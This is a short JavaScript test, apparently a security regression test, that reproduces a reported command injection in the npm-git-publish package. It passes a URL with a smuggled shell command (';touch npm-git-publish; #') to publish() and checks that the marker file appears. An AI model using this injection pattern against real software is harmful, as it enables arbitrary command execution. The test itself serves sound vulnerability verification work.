// RCE or CI?
//https://hackerone.com/reports/730121
test("Command Injection in npm-git-publish", () => {
  const git = require("npm-git-publish");
  const fs = require("fs");
  const path = "./npm-git-publish";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  git.publish(".", "http://gihub.com ;touch npm-git-publish; #").then(() => {
    sleep.sleep(5);
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {}); //deleting the file after creation
  });
});
